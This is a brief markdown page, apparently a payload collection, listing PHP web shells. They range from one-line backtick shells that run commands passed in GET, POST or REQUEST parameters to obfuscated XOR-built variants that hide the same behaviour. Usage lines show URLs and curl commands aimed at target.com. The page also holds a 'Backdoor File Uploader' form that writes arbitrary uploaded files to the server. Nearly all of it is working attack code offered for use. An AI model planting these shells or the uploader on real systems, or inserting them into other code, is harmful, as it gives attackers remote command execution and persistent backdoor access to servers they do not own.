# Simple and Obfuscate PHP Web Shell

<h1>PHP Web Shell</h1>

```
<?=`$_GET[0]`?>

Usage :
  http://target.com/path/to/shell.php?0=command
```

```
<?=`$_POST[0]`?>

Usage :
  curl -X POST http://target.com/path/to/shell.php -d "0=id"
```

```
<?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>

Usage : 
  http://target.com/path/to/shell.php?0=command
 
Note :
  Obfuscation of <?=`$_GET[0]`?>
```

```
<?=`{$_REQUEST['_']}`?>

Usage :
 - http://target.com/path/to/shell.php?_=command
 - curl -X POST http://target.com/path/to/shell.php -d "_=id"

Note :
  Accept GET and POST method
```

```
<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?> <?=${'_'.$_}["_"](${'_'.$_}["__"]);?>

Usage :
  http://target.com/path/to/shell.php?_=system&__=ls
```

<h1>Backdoor File Uploader</h1>

```
<?php echo 'Uploader<br>';echo '<br>';echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload !!!</b><br><br>'; }else { echo '<b>Upload !!!</b><br><br>'; }}?>
```
